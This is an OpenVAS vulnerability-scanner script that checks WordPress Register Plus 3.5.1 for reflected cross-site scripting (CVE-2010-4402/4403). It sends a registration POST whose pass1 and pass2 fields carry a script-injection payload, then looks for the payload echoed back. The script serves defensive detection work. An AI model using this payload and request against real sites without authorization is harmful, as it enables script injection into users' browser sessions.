###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_register_plus_mult_vuln.nasl 13794 2019-02-20 14:59:32Z cfischer $
#
# WordPress Register Plus Plugin Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801492");
  script_version("$Revision: 13794 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-20 15:59:32 +0100 (Wed, 20 Feb 2019) $");
  script_tag(name:"creation_date", value:"2010-12-27 09:55:05 +0100 (Mon, 27 Dec 2010)");
  script_bugtraq_id(45057);
  script_cve_id("CVE-2010-4402", "CVE-2010-4403");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_name("WordPress Register Plus Plugin Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://websecurity.com.ua/4539");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42360");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/96143/registerplus-xss.txt");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/archive/1/514903/100/0/threaded");

  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"impact", value:"Successful exploitation could allow an attacker to execute
  arbitrary HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"WordPress Register Plus 3.5.1");

  script_tag(name:"insight", value:"The flaws are due to,

  - Input passed via the 'firstname', 'lastname', 'website', 'aim', 'yahoo',
  'jabber', 'about', 'pass1', and 'pass2' parameters to 'wp-login.php'
  (when 'action' is set to 'register') is not properly sanitised before being
  returned to the user.

  - A direct request to 'dash_widget.php' and 'register-plus.php' allows
  remote attackers to obtain installation path in an error message.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running WordPress Register Plus Plugin and is prone
  to multiple vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE))exit(0);
if(!dir = get_app_location(cpe:CPE, port:port))exit(0);

if(dir == "/")
  dir = "";

useragent = http_get_user_agent();
filename = string(dir + "/wp-login.php?action=register");
authVariables = "user_login=abc&user_email=abc%40gmail&firstname=&lastname=" +
                "&website=&aim=&yahoo=&jabber=&about=&pass1=%22%3E%3Cscript" +
                "%3Ealert%28document.cookie%29%3C%2Fscript%3E&pass2=%22%3E%" +
                "3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E";

host = http_host_name( port:port );

sndReq2 = string("POST ", filename, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 "Accept-Language: en-us,en;q=0.5\r\n",
                 "Accept-Encoding: gzip,deflate\r\n",
                 "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n",
                 "Keep-Alive: 115\r\n",
                 "Connection: keep-alive\r\n",
                 "Referer: http://", host, filename, "\r\n",
                 "Cookie: wordpress_test_cookie=WP+Cookie+check; wpss_firstvisit=1; wpss_safesearch=1\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(authVariables), "\r\n\r\n",
                  authVariables);

rcvRes2 = http_keepalive_send_recv(port:port, data:sndReq2);

if(egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes2) &&
        ("><script>alert(document.cookie)</script>" >< rcvRes2)) {
  report = report_vuln_url(port:port, url:filename);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);